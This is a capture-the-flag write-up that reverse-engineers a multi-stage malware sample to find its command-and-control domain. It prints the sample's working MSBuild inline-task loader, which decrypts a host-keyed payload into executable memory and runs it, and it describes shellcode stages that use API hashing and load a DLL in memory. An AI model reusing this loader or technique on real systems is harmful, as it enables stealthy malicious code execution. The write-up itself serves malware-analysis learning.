---
title: '[WRITE UP] - HolaCTF 2025 - I love malware'
description: ''
date: '2025-08-31'
tags: ['2025', 'Reverse', 'Malware Analysis', 'CTF']
authors: ['tdeit']
draft: false
---


# Overview


# Challenge Information
**The goal** : Find C&C domain of the malware

# Solution & Analysis

## Stage 1: MSBuild LOLBIN execution

### Analysis
The challenge provides 3 files: `BraveCrashHandler.csproj`, `BraveCrashHandler.exe` and `note.txt`.

The `note.txt` file contains the following command:

```
commandline: "C:\Program Files (x86)\BraveSoftware\CrashReports\BraveCrashHandler.exe" C:\Progra~2\BraveSoftware\CrashReports\BraveCrashHandler.csproj
```

After quick checking, I know `BraveCrashHandler.exe` is `MSBuild.exe` - a legitimate Windows app. 

And `BraveCrashHandler.csproj` contains `<UsingTask TaskFactory="CodeTaskFactory">` with C# inline. When running `BraveCrashHandler.exe <project>.csproj` (reality is MSBuild.exe):

1. Compile C# code to task
2. Execute that task
3. Task of attacker decrypted Base64 payload by 3DES/ECB with the key = MD5(ProcessorCount + PROCESSOR_ARCHITECTURE + PROCESSOR_LEVEL + MachineName)
4. Allocate RWX memory (by `VirtualAlloc`) and copy decrypted payload to it, and then call it directly as a function.
**Payload running in process msbuild/BraveCrashHandler.exe (in-memory).

<div class="max-h-96 overflow-auto">
```C#
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="BuildProject">
    <Project
        DataProject="BASE_64_ENCODED_PAYLOAD_HERE"
		/>
  </Target>
  <UsingTask
    TaskName="Project"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll" >
    <ParameterGroup>
      <DataProject ParameterType="System.String"
                   Required="true" />
    </ParameterGroup>
    <Task>
      <Reference Include="System.Runtime"/>
      <Code Type="Class"
            Language="cs">
        <![CDATA[
using System;
using System.Text;
using System.Runtime.InteropServices;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;
using System.Security.Cryptography;
using System.Runtime.ExceptionServices;
public class Project : Task, ITask
{
    private string _DataProject;
    public virtual string DataProject
    {
        get
        {
            return _DataProject;
        }
        set
        {
            _DataProject = value;
        }
    }
    [DllImport("kernel32", EntryPoint = "VirtualAlloc")]
    private static extern IntPtr Alloc(IntPtr lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
    delegate void MyFunction();
    [HandleProcessCorruptedStateExceptions]
    public override bool Execute()
    {
        var inputArray = Convert.FromBase64String(DataProject);
        var key = Environment.ProcessorCount + Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE") + Environment.GetEnvironmentVariable("PROCESSOR_LEVEL") + Environment.MachineName;
        TripleDESCryptoServiceProvider tripleDES = new TripleDESCryptoServiceProvider();
        var keyBytes = Encoding.UTF8.GetBytes(key);
        using(var md5 = MD5.Create())
        {
            tripleDES.Key = md5.ComputeHash(keyBytes);
        }
        tripleDES.Mode = CipherMode.ECB;
        tripleDES.Padding = PaddingMode.PKCS7;
        var cTransform = tripleDES.CreateDecryptor();
        var resultArray = cTransform.TransformFinalBlock(inputArray, 0, inputArray.Length);
        tripleDES.Clear();
        var funcAddr = Alloc(IntPtr.Zero, (UInt32)resultArray.Length, 0x1000, 0x40);
        Marshal.Copy(resultArray, 0, funcAddr, resultArray.Length);
        var myFunction = (MyFunction)Marshal.GetDelegateForFunctionPointer(funcAddr, typeof(MyFunction));
        try
        {
            myFunction();
        }
        catch { }
        return true;
    }
}

				
      </Code>
    </Task>
  </UsingTask>
</Project>
```
</div>


You can read more about this technique [here](https://lolbas-project.github.io/lolbas/Binaries/Msbuild/)

### Solution to extract shellcode

From the information of `note.txt` we can create simple script to extract shellcode:

```python
import base64, hashlib
from Crypto.Cipher import DES3
from Crypto.Util.Padding import unpad

DATA_PROJECT_B64 = """BASE64"""
MACHINE_NAME = "ADMIN"
PROCESSOR_LEVEL = "6"

def dec_with(count, arch):
    k = hashlib.md5(f"{count}{arch}{PROCESSOR_LEVEL}{MACHINE_NAME}".encode()).digest()
    k = DES3.adjust_key_parity(k)
    c = DES3.new(k, DES3.MODE_ECB)
    try:
        return unpad(c.decrypt(base64.b64decode(DATA_PROJECT_B64)), 8)
    except:
        return None

for arch in ("x86", "AMD64"):
    for count in range(1, 33):
        blob = dec_with(count, arch)
        if blob:
            open(f"dec_{arch}_{count}.bin", "wb").write(blob)

```

## Stage 2: shellcode

### Analysis

After open it by IDA and reviewing some function, I found a similiar with the sample I analyzed before: [VCS Passport 2024](https://tdeit.github.io/blog/vcs-passport-2024/#stage-2-shellcode)

You should read about that write-up to understand more about this stage.

Because it is similiar, I will not repeat it here.

I concluded that: function `sub_884` is the main function of the shellcode

![alt text](/src/assets/Holactf/img-1.png)


But there are no function called it (I used x-ref on IDA), it is quite strange because, this function must have parameter to execute normally.

So I just scroll above it, and I found these:

![alt text](/blog/img/Hola-CTF-2025/img-1.png)

So I have to convert these to code and function by press `C` and `p` on IDA.

Then, we can see clearly that this function will call `sub_884`, from there we can debug to see what is going on.
![alt text](/src/assets/Holactf/img-2.png)


### Solution

I used `sclauncher` to convert this shellcode to exe file, and then debug it by x64dbg.

And the entry point I choose is: `0x82F`.

After debugging on x64dbg, I know this sample will choose `mode 1` and use API `CryptDecrypt` (quite different from the previous sample but no matter)to decrypt the data.


Set breakpoint on this address (before it call shellcode like a function) and get shellcode:
![alt text](/src/assets/Holactf/img-3.png).


## Stage 3: Shellcode 2

### Analysis

After open it by IDA, I saw it have many function but the flow is not clear, so I just continue convert it to exe file and then open it by IDA again.

There are some function that I need to clarify to understand more about the flow:

#### Custom CRC-32
This sample uses this hashing algorithm (custom CRC-32) to to perform tasks such as dynamic API resolution.

![alt text](/src/assets/Holactf/img-4.png).

#### Runtime API Resolve

In short, this will resolves the address of the function by walking through the PEB and using the custom CRC-32 to match the hash of the function name.

I wrote explain about this technique in [this blog](https://tdeit.github.io/blog/vcs-passport-2024/#resolve-api-address).

![alt text](/src/assets/Holactf/img-5.png)
![alt text](/src/assets/Holactf/img-6.png)

#### Decryption routine


### Flow of the shellcode

In short, this shellcode will decrypt the encrypted data (actually is the DLL) then call it as a function in memory.

### Solution

Dump the decrypted DLL and and static analysis it, then I know the DLL have the function that call `WinHttpCrackUrl ` to parse the C&C domain so I can just put in there to see the C&C domain.


![alt text](/src/assets/Holactf/img-7.png)



## C&C Domain


`guangdongshop.net`


